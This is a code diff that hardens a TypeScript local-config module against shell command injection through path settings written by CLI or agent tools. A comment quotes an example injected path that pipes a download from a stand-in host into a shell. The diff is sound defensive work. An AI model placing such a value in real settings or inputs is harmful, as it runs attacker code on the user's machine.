@@ -21,7 +21,7 @@ import { z } from 'zod';
 import { getLocalConfigPath } from './paths.js';
 import { atomicWriteFileSync } from './state-persistence.js';
 import { LocalRepoCacheSchema, type LocalRepoCache } from './state-schema.js';
-import { errorMessage } from './errors.js';
+import { errorMessage, ValidationError } from './errors.js';
 import { warn } from './logger.js';
 
 const MODULE = 'local-config';
@@ -123,7 +123,9 @@ export function getMachinePath(key: MachinePathKey, synced: SyncedPaths): string
   const local = readStoredPath(key);
   if (local) return local.path || undefined;
   const syncedValue = synced[key];
-  if (syncedValue && isFileHere(syncedValue)) {
+  // A synced value with a shell metacharacter (written by an older client) is
+  // never adopted into the local file.
+  if (syncedValue && isFileHere(syncedValue) && !SHELL_UNSAFE_PATH.test(syncedValue)) {
     adopt({ [key]: { path: syncedValue, source: 'adopted' } });
   }
   return syncedValue;
@@ -144,13 +146,34 @@ export function getMachinePathSource(
   return syncedValue ? 'synced' : undefined;
 }
 
+// Shell metacharacters, quotes, backslash and line breaks. A path setting can
+// be written by an agent (MCP `config`/`setup`) and an older workflow pasted
+// it into shell text, so a value like `/tmp/x$(curl evil|sh)` would run.
+const SHELL_UNSAFE_PATH = /[$`"'\\;|&<>\n\r]/;
+
+/**
+ * Throw when a path setting contains a character a shell treats specially
+ * ($ ` " ' \ ; | & < >, a line break or NUL). Checked on every write, CLI
+ * and MCP alike.
+ */
+export function assertSafeMachinePath(key: MachinePathKey, value: string): void {
+  if (SHELL_UNSAFE_PATH.test(value) || value.includes('\0')) {
+    throw new ValidationError(
+      `Invalid value for ${key}: a path may not contain $ \` " ' \\ ; | & < >, a line break or NUL.`,
+    );
+  }
+}
+
 /**
  * Set (or, with `undefined` or an empty string, clear) a path setting for
  * this machine only, recording how the value was obtained. A relative value
  * is stored resolved against the current directory (#1933), so it never
  * depends on where a later command runs. Returns what was stored.
+ *
+ * @throws ValidationError when the path contains a shell metacharacter.
  */
 export function setMachinePath(key: MachinePathKey, value = '', source: MachinePathSource = 'set'): string {
+  assertSafeMachinePath(key, value);
   const stored = value && path.resolve(value);
   updateLocalConfig({ [key]: { path: stored, source } });
   return stored;
